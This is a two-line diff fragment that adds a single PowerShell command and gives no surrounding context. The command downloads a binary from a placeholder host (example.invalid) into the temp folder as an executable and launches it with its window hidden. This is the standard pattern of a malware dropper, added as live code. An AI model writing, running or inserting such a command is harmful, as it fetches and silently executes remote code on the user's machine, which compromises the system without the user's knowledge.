@@ -1,0 +1,2 @@
+Start-BitsTransfer -Source http://example.invalid/u.bin -Destination $env:TEMP\u.exe; Start-Process $env:TEMP\u.exe -WindowStyle Hidden
+
